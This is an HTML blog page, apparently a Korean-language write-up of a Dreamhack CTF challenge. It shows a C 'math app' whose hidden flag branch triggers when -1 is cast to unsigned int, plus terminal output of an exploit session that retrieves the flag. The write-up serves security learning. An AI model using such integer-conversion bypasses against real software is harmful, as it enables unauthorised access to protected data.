@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ctf5 · Gahyun Baek</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@300;400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css">
+  <style>
+    .post-header { margin-bottom: 2.5rem; }
+    .post-header h1 {
+      font-family: 'DM Serif Display', serif;
+      font-size: 2rem; font-weight: 400; line-height: 1.2;
+      margin-bottom: .6rem;
+    }
+    .post-meta { display: flex; gap: .8rem; align-items: center; font-size: .78rem; color: var(--muted); }
+    .post-tag {
+      background: var(--tag); border-radius: 4px;
+      padding: .1rem .5rem; font-size: .72rem; color: var(--muted);
+    }
+    .post-body { line-height: 1.8; font-size: .95rem; }
+    .post-body h2 { font-family: 'DM Serif Display', serif; font-size: 1.3rem; font-weight: 400; margin: 2rem 0 .8rem; }
+    .post-body h3 { font-size: 1rem; font-weight: 600; margin: 1.5rem 0 .5rem; }
+    .post-body p  { margin-bottom: 1rem; color: var(--ink); }
+    .post-body ul { margin: .5rem 0 1rem 1.5rem; }
+    .post-body li { margin-bottom: .3rem; }
+    .post-body pre {
+      background: #1a1814; color: #f7f5f0;
+      border-radius: 6px; padding: 1.2rem;
+      overflow-x: auto; font-size: .82rem;
+      margin: 1.2rem 0;
+    }
+    .post-body code { font-family: 'DM Mono', monospace; }
+    .post-body p code {
+      background: var(--tag); border-radius: 3px;
+      padding: .1rem .35rem; font-size: .85em;
+    }
+    .post-body a { color: var(--accent); text-decoration: none; }
+    .post-body a:hover { text-decoration: underline; }
+    .back-link {
+      display: inline-flex; align-items: center; gap: .4rem;
+      font-size: .8rem; color: var(--muted); text-decoration: none;
+      margin-bottom: 2rem;
+      transition: color .2s;
+    }
+    .back-link:hover { color: var(--ink); }
+    hr.post-divider { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="../../index.html">Gahyun Baek</a>
+  <ul class="nav-links">
+    <li><a href="../../index.html">Home</a></li>
+    <li><a href="../papers.html">Papers</a></li>
+    <li><a href="../posts.html">Posts</a></li>
+    <li><a href="../blog.html">Blog</a></li>
+    <li><a href="../cv.html">CV</a></li>
+  </ul>
+</nav>
+
+<main class="page">
+  <a class="back-link" href="../posts.html">
+    ← Back to Posts
+  </a>
+
+  <div class="post-header">
+    <h1>ctf5</h1>
+    <div class="post-meta">
+      <span>2026·03</span>
+      <span class="post-tag">CTF</span>
+    </div>
+  </div>
+
+  <hr class="post-divider">
+
+  <div class="post-body">
+<h2>문제</h2>
+
+<p><strong>문제 설명</strong></p>
+
+<p><strong>I just made a simple C program to check statistics and added functionality to check whether a number is odd, among other features. There is a vulnerability hidden in the obfuscated code good luck finding it.</strong></p>
+
+<pre><code class="language-c">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0313]
+└─$ cat chall.c
+#include &lt;fcntl.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;time.h&gt;
+#include &lt;stdbool.h&gt;
+#include &lt;unistd.h&gt;
+
+#define B 0xffffffffU
+
+typedef struct
+{
+    unsigned int x;
+    bool y;
+} t1;
+
+static unsigned int g = 0;
+
+static void f1(void)
+{
+    puts("=== Math app for nerds v2.1 ===");
+    puts(" 1) Check range  ");
+    puts("2) Absolute value ");
+    puts(" 3) Normalize input ");
+    puts("4) Square number  ");
+    puts("5) Clamp to 8-bit ");
+    puts(" 6) Parity check ");
+    puts("7) Statistics     ");
+    puts(" 8) Exit          ");
+}
+
+static void f2(void)
+{
+    char b[50];
+    int fd = open("flag.txt", O_RDONLY);
+    if (fd == -1)
+        exit(1);
+
+    int n = read(fd, b, sizeof(b) - 1);
+    b[n] = '\0';
+    puts(b);
+    close(fd);
+}
+
+static int f4(unsigned int v)
+{
+    unsigned int t = v;
+
+    t = t + 1;
+
+    if (t == 0)
+    {
+        if ((v &amp; B) == B)
+        {
+            if (~v == 0)
+            {
+                return 1;
+            }
+        }
+    }
+
+    if (g != 0)
+    {
+        unsigned int f = v;
+        f = f + 2;
+        f = f - 2;
+        if (f == 0)
+            return 1;
+    }
+
+    return 0;
+}
+
+int main(void)
+{
+    char b[50];
+    unsigned int c;
+    unsigned int v;
+
+    g = (unsigned int)time(NULL) % 256;
+
+    f1();
+    printf("&gt; ");
+
+    if (!fgets(b, sizeof(b), stdin))
+        return 0;
+
+    char *e;
+    c = strtoul(b, &amp;e, 10);
+    if (c == 8)
+        return 0;
+
+    printf("Enter value: ");
+    if (!fgets(b, sizeof(b), stdin))
+        return 0;
+
+    int tv = atoi(b);
+    v = (unsigned int)tv;
+
+    t1 container;
+    container.x = v;
+    container.y = false;
+
+    switch (c)
+    {
+    case 1:
+        puts("Range OK");
+        break;
+
+    case 2:
+    {
+        unsigned int av = container.x;
+        if ((int)container.x &lt; 0)
+        {
+            av = -container.x;
+        }
+        printf("Abs: %u\n", av);
+    }
+    break;
+
+    case 3:
+    {
+        unsigned int n = container.x;
+
+        container.y = true;
+
+        unsigned int check = n;
+
+        if (check == B)
+        {
+            if (f4(check))
+            {
+                f2();
+                return 0;
+            }
+        }
+
+        unsigned int r = n;
+        if (r &lt; B)
+        {
+            r = r + 1;
+        }
+        else
+        {
+            r = 0;
+        }
+
+        printf("Normalized: %u\n", r);
+        break;
+    }
+
+    case 4:
+    {
+        unsigned long s = (unsigned long)container.x * container.x;
+        printf("Square: %lu\n", s);
+    }
+    break;
+
+    case 5:
+        printf("Clamped: %u\n", container.x &amp; 0xff);
+        break;
+
+    case 6:
+        puts((container.x % 2) ? "Odd" : "Even");
+        break;
+
+    case 7:
+        puts("Statistics complete");
+        break;
+
+    default:
+        puts("Invalid option");
+        break;
+    }
+
+    return 0;
+}
+</code></pre>
+
+<h2>해결</h2>
+
+<pre><code class="language-bash">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0313]
+└─$ python ./exploit.py
+[+] Opening connection to host3.dreamhack.games on port 15404: Done
+[*] Switching to interactive mode
+=== Math app for nerds v2.1 ===
+ 1) Check range
+2) Absolute value
+ 3) Normalize input
+4) Square number
+5) Clamp to 8-bit
+ 6) Parity check
+7) Statistics
+ 8) Exit
+&gt; $ 3
+Enter value: $ -1
+DH{ju5t_1nt3g3r_und3rfl0w!}
+</code></pre>
+
+<ul>
+<li>1이 **unsigned int**로 변환되면 일반적인 32비트 환경에서는:</li>
+</ul>
+
+<p>(unsignedint)-1==<strong><code>0xffffffffU</code></strong></p>
+  </div>
+</main>
+
+<script src="../../js/nav.js"></script>
+</body>
+</html>
